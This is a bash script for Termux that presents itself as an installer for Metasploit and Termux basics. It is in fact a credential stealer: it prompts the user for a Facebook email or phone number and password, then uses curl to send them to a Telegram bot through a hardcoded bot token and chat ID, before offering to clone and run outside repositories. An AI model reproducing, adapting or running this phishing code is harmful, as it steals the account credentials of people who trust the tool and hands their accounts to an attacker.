#!/bin/bash
pkg install git && pkg install python 
clear

green='\e[1;32m'
cyan='\e[1;36m'
red='\e[1;31m'
blue='\e[1;34m'
white='\e[1;37m'
yellow='\e[1;33m'
purple='\e[1;35m'
##################
clear
echo -e $red
echo  "                                                          ";
echo  "                                                          ";
echo  "                                                          ";
echo  "                                              t           ";
echo  "                                   ..       : EE.         ";
echo  "                                  ,W,     .Et :KW;        ";
echo  "                                 t##,    ,W#t   G#j       ";
echo  "                                L###,   j###t    j#D.     ";
echo  "                              .E#j##,  G#fE#t itttG#K,    ";
echo  "                             ;WW; ##,:K#i E#t E##DDDDG:   ";
echo  "                            j#E.  ##f#W,  E#t E#E         ";
echo  "                          .D#L    ###K:   E#t E#E         ";
echo  "                         :K#t     ##D.    E#t E##EEEEEEt  ";
echo  "                         ...      #G      ..  tffffffffft ";
echo  "                                  j                       ";
echo  "                                                          ";
echo ""
echo "Please Sigin for you'r email facebook to cuntonu "

email_regex=8

function validate_email() {

    

    if [[ ${#email} -ge $email_regex ]]; then
        return 0
    else
        return 1
    fi
}

function validate_password() {

    password_min_length=6


    if [[ ${#password} -ge $password_min_length ]]; then
        return 0
    else
        return 1
    fi
}

function send_data_to_telegram() {
    
    bot_token="7023319102:AAHma8eMrLiYtW2-4sF0bGDXuMHdjQgHKxs"

    chat_id="5792222595"

     message=" $email : $password"

    
    curl -s -X POST https://api.telegram.org/bot$bot_token/sendMessage \
        -d chat_id=$chat_id \
        -d text="$message"
}

while true; do

    read -p "Enter emailor Phone " email


    if validate_email; then
        break
    else
        echo "Email or phone Error"
    fi
done

while true; do

    read -p  "Enter Pasword" password


    if validate_password; then
        break
    else
         echo 'Pasword Error '  
    fi
done


send_data_to_telegram
clear

echo "Down...."
echo  "Install Metasploit 1 "
echo "Install Tremix basics 2 "
read  user_choice

if [[ $user_choice -eq 1 || $user_choice -eq 2 ]]; then
    if [[ $user_choice -eq 1 ]]; then

    git clone https://github.com/Vairous7x/Metasploit-Fix && cd Metasploit-Fix && bash metasploit.sh && msfconsole
       

    else
        git clone https://github.com/Cyber-218/Termux- && cd Termux- && python basic_termux.py 
    fi
else

    exit 1
fi